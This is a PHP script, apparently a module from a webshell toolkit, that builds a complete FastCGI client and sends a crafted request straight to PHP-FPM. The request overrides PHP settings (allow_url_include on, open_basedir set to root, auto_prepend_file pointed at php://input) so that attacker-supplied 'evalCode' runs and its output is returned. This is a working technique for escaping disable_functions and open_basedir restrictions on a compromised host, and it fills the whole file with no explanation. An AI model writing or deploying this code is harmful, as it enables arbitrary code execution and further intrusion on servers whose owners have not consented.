@ini_set("display_errors", "0");
@set_time_limit(0);

try {
    class TimedOutException extends \Exception
    {
    }
    class ForbiddenException extends \Exception
    {
    }
    class Client
    {
        const VERSION_1 = 1;
        const BEGIN_REQUEST = 1;
        const ABORT_REQUEST = 2;
        const END_REQUEST = 3;
        const PARAMS = 4;
        const STDIN = 5;
        const STDOUT = 6;
        const STDERR = 7;
        const DATA = 8;
        const GET_VALUES = 9;
        const GET_VALUES_RESULT = 10;
        const UNKNOWN_TYPE = 11;
        const MAXTYPE = self::UNKNOWN_TYPE;
        const RESPONDER = 1;
        const AUTHORIZER = 2;
        const FILTER = 3;
        const REQUEST_COMPLETE = 0;
        const CANT_MPX_CONN = 1;
        const OVERLOADED = 2;
        const UNKNOWN_ROLE = 3;
        const MAX_CONNS = 'MAX_CONNS';
        const MAX_REQS = 'MAX_REQS';
        const MPXS_CONNS = 'MPXS_CONNS';
        const HEADER_LEN = 8;
        const REQ_STATE_WRITTEN = 1;
        const REQ_STATE_OK = 2;
        const REQ_STATE_ERR = 3;
        const REQ_STATE_TIMED_OUT = 4;
        const FCGI_MAX_LENGTH = 0xffff;
        private $_sock = null;
        private $_host = null;
        private $_port = null;
        private $_keepAlive = false;
        private $_requests = array();
        private $_persistentSocket = false;
        private $_connectTimeout = 5000;
        private $_readWriteTimeout = 5000;

        public function __construct($host, $port)
        {
            $this->_host = $host;
            $this->_port = $port;
        }

        public function getHost()
        {
            return $this->_host;
        }

        public function setKeepAlive($b)
        {
            $this->_keepAlive = (bool)$b;
            if (!$this->_keepAlive && $this->_sock) {
                fclose($this->_sock);
            }
        }

        public function getKeepAlive()
        {
            return $this->_keepAlive;
        }

        public function setPersistentSocket($b)
        {
            $was_persistent = ($this->_sock && $this->_persistentSocket);
            $this->_persistentSocket = (bool)$b;
            if (!$this->_persistentSocket && $was_persistent) {
                fclose($this->_sock);
            }
        }

        public function getPersistentSocket()
        {
            return $this->_persistentSocket;
        }

        public function setConnectTimeout($timeoutMs)
        {
            $this->_connectTimeout = $timeoutMs;
        }

        public function getConnectTimeout()
        {
            return $this->_connectTimeout;
        }

        public function setReadWriteTimeout($timeoutMs)
        {
            $this->_readWriteTimeout = $timeoutMs;
            $this->set_ms_timeout($this->_readWriteTimeout);
        }

        public function getReadWriteTimeout()
        {
            return $this->_readWriteTimeout;
        }

        private function set_ms_timeout($timeoutMs)
        {
            if (!$this->_sock) {
                return false;
            }
            return stream_set_timeout($this->_sock, floor($timeoutMs / 1000), ($timeoutMs % 1000) * 1000);
        }

        private function connect()
        {
            if (!$this->_sock) {
                if ($this->_persistentSocket) {
                    $this->_sock = pfsockopen($this->_host, $this->_port, $errno, $errstr, $this->_connectTimeout / 1000);
                } else {
                    $this->_sock = fsockopen($this->_host, $this->_port, $errno, $errstr, $this->_connectTimeout / 1000);
                }

                if (!$this->_sock) {
                    throw new \Exception('Unable to connect to FastCGI application: ' . $errstr);
                }

                if (!$this->set_ms_timeout($this->_readWriteTimeout)) {
                    throw new \Exception('Unable to set timeout on socket');
                }
            }
        }

        private function buildPacket($type, $content, $requestId = 1)
        {
            $clen = strlen($content);
            return chr(self::VERSION_1)         /* version */
                . chr($type)                    /* type */
                . chr(($requestId >> 8) & 0xFF) /* requestIdB1 */
                . chr($requestId & 0xFF)        /* requestIdB0 */
                . chr(($clen >> 8) & 0xFF)     /* contentLengthB1 */
                . chr($clen & 0xFF)             /* contentLengthB0 */
                . chr(0)                        /* paddingLength */
                . chr(0)                        /* reserved */
                . $content;                     /* content */
        }

        private function buildNvpair($name, $value)
        {
            $nlen = strlen($name);
            $vlen = strlen($value);
            if ($nlen < 128) {
                /* nameLengthB0 */
                $nvpair = chr($nlen);
            } else {
                /* nameLengthB3 & nameLengthB2 & nameLengthB1 & nameLengthB0 */
                $nvpair = chr(($nlen >> 24) | 0x80) . chr(($nlen >> 16) & 0xFF) . chr(($nlen >> 8) & 0xFF) . chr($nlen & 0xFF);
            }
            if ($vlen < 128) {
                /* valueLengthB0 */
                $nvpair .= chr($vlen);
            } else {
                /* valueLengthB3 & valueLengthB2 & valueLengthB1 & valueLengthB0 */
                $nvpair .= chr(($vlen >> 24) | 0x80) . chr(($vlen >> 16) & 0xFF) . chr(($vlen >> 8) & 0xFF) . chr($vlen & 0xFF);
            }
            /* nameData & valueData */
            return $nvpair . $name . $value;
        }

        private function readNvpair($data, $length = null)
        {
            $array = array();

            if ($length === null) {
                $length = strlen($data);
            }

            $p = 0;

            while ($p != $length) {

                $nlen = ord($data[$p++]);
                if ($nlen >= 128) {
                    $nlen = ($nlen & 0x7F << 24);
                    $nlen |= (ord($data[$p++]) << 16);
                    $nlen |= (ord($data[$p++]) << 8);
                    $nlen |= (ord($data[$p++]));
                }
                $vlen = ord($data[$p++]);
                if ($vlen >= 128) {
                    $vlen = ($nlen & 0x7F << 24);
                    $vlen |= (ord($data[$p++]) << 16);
                    $vlen |= (ord($data[$p++]) << 8);
                    $vlen |= (ord($data[$p++]));
                }
                $array[substr($data, $p, $nlen)] = substr($data, $p + $nlen, $vlen);
                $p += ($nlen + $vlen);
            }

            return $array;
        }

        private function decodePacketHeader($data)
        {
            $ret = array();
            $ret['version'] = ord($data[0]);
            $ret['type'] = ord($data[1]);
            $ret['requestId'] = (ord($data[2]) << 8) + ord($data[3]);
            $ret['contentLength'] = (ord($data[4]) << 8) + ord($data[5]);
            $ret['paddingLength'] = ord($data[6]);
            $ret['reserved'] = ord($data[7]);
            return $ret;
        }

        private function readPacket()
        {
            if ($packet = fread($this->_sock, self::HEADER_LEN)) {
                $resp = $this->decodePacketHeader($packet);
                $resp['content'] = '';
                if ($resp['contentLength']) {
                    $len = $resp['contentLength'];
                    while ($len && ($buf = fread($this->_sock, $len)) !== false) {
                        $len -= strlen($buf);
                        $resp['content'] .= $buf;
                    }
                }
                if ($resp['paddingLength']) {
                    $buf = fread($this->_sock, $resp['paddingLength']);
                }
                return $resp;
            } else {
                return false;
            }
        }

        public function getValues(array $requestedInfo)
        {
            $this->connect();

            $request = '';
            foreach ($requestedInfo as $info) {
                $request .= $this->buildNvpair($info, '');
            }
            fwrite($this->_sock, $this->buildPacket(self::GET_VALUES, $request, 0));

            $resp = $this->readPacket();
            if ($resp['type'] == self::GET_VALUES_RESULT) {
                return $this->readNvpair($resp['content'], $resp['length']);
            } else {
                throw new \Exception('Unexpected response type, expecting GET_VALUES_RESULT');
            }
        }

        public function request(array $params, $stdin)
        {
            $id = $this->async_request($params, $stdin);
            return $this->wait_for_response($id);
        }

        public function async_request(array $params, $stdin)
        {
            $this->connect();
            $id = mt_rand(1, (1 << 16) - 1);
            $keepAlive = intval($this->_keepAlive || $this->_persistentSocket);

            $request = $this->buildPacket(self::BEGIN_REQUEST
                , chr(0) . chr(self::RESPONDER) . chr($keepAlive) . str_repeat(chr(0), 5)
                , $id
            );

            $paramsRequest = '';
            foreach ($params as $key => $value) {
                $paramsRequest .= $this->buildNvpair($key, $value, $id);
            }
            if ($paramsRequest) {
                $request .= $this->buildPacket(self::PARAMS, $paramsRequest, $id);
            }
            $request .= $this->buildPacket(self::PARAMS, '', $id);

            if ($stdin) {
                while (strlen($stdin) > self::FCGI_MAX_LENGTH) {
                    $chunkStdin = substr($stdin, 0, self::FCGI_MAX_LENGTH);
                    $request .= $this->buildPacket(self::STDIN, $chunkStdin, $id);
                    $stdin = substr($stdin, self::FCGI_MAX_LENGTH);
                }
                $request .= $this->buildPacket(self::STDIN, $stdin, $id);
            }
            $request .= $this->buildPacket(self::STDIN, '', $id);

            if (fwrite($this->_sock, $request) === false || fflush($this->_sock) === false) {

                $info = stream_get_meta_data($this->_sock);

                if ($info['timed_out']) {
                    throw new TimedOutException('Write timed out');
                }
                fclose($this->_sock);
                throw new \Exception('Failed to write request to socket');
            }

            $this->_requests[$id] = array(
                'state' => self::REQ_STATE_WRITTEN,
                'response' => null
            );

            return $id;
        }

        public function wait_for_response_data($requestId, $timeoutMs = 0)
        {
            if (!isset($this->_requests[$requestId])) {
                throw new \Exception('Invalid request id given');
            }

            if ($this->_requests[$requestId]['state'] == self::REQ_STATE_OK
                || $this->_requests[$requestId]['state'] == self::REQ_STATE_ERR
            ) {
                return $this->_requests[$requestId];
            }

            if ($timeoutMs > 0) {
                $this->set_ms_timeout($timeoutMs);
            } else {
                $timeoutMs = $this->_readWriteTimeout;
            }
            $startTime = microtime(true);

            while ($resp = $this->readPacket()) {
                if ($resp['type'] == self::STDOUT || $resp['type'] == self::STDERR) {
                    if ($resp['type'] == self::STDERR) {
                        $this->_requests[$resp['requestId']]['state'] = self::REQ_STATE_ERR;
                    }
                    $this->_requests[$resp['requestId']]['response'] .= $resp['content'];
                }
                if ($resp['type'] == self::END_REQUEST) {
                    $this->_requests[$resp['requestId']]['state'] = self::REQ_STATE_OK;
                    if ($resp['requestId'] == $requestId) {
                        break;
                    }
                }
                if (microtime(true) - $startTime >= ($timeoutMs * 1000)) {
                    $this->set_ms_timeout($this->_readWriteTimeout);
                    throw new \Exception('Timed out');
                }
            }

            if (!is_array($resp)) {
                $info = stream_get_meta_data($this->_sock);
                $this->set_ms_timeout($this->_readWriteTimeout);
                if ($info['timed_out']) {
                    throw new TimedOutException('Read timed out');
                }

                if ($info['unread_bytes'] == 0
                    && $info['blocked']
                    && $info['eof']) {
                    throw new ForbiddenException('Not in white list. Check listen.allowed_clients.');
                }

                throw new \Exception('Read failed');
            }

            $this->set_ms_timeout($this->_readWriteTimeout);

            switch (ord($resp['content'][4])) {
                case self::CANT_MPX_CONN:
                    throw new \Exception('This app can\'t multiplex [CANT_MPX_CONN]');
                    break;
                case self::OVERLOADED:
                    throw new \Exception('New request rejected; too busy [OVERLOADED]');
                    break;
                case self::UNKNOWN_ROLE:
                    throw new \Exception('Role value not known [UNKNOWN_ROLE]');
                    break;
                case self::REQUEST_COMPLETE:
                    return $this->_requests[$requestId];
            }
        }

        public function wait_for_response($requestId, $timeoutMs = 0)
        {
            return $this->wait_for_response_data($requestId, $timeoutMs)['response'];
        }
    }
    $result="";
    $code = "<?php ".get("evalCode").";exit;?>";
    $php_value = "allow_url_include = On\nsafe_mode = Off\nopen_basedir = /\nauto_prepend_file = php://input";
    $filepath=get("scriptFile");
    $params = array(
        'GATEWAY_INTERFACE' => 'FastCGI/1.0',
        'REQUEST_METHOD'    => 'POST',
        'SCRIPT_FILENAME'   => $filepath,
        //'DOCUMENT_ROOT'     => '/',
        'PHP_ADMIN_VALUE'	=> $php_value,
        'PHP_VALUE'         => $php_value,
        'SERVER_SOFTWARE'   => 'php/fcgiclient',
        'REMOTE_ADDR'       => '127.0.0.1',
        'REMOTE_PORT'       => '9985',
        'SERVER_ADDR'       => '127.0.0.1',
        'SERVER_PORT'       => '80',
        'SERVER_NAME'       => 'localhost',
        'SERVER_PROTOCOL'   => 'HTTP/1.1',
        'CONTENT_LENGTH'    => strlen($code)
    );

    $client = new Client(get('fpm_host'),get('fpm_port'));
    $result=$result.$client->request($params, $code);

} catch (Exception $e) {
    $result=$result."ERROR://".$e -> getMessage()."\n";
}
return $result;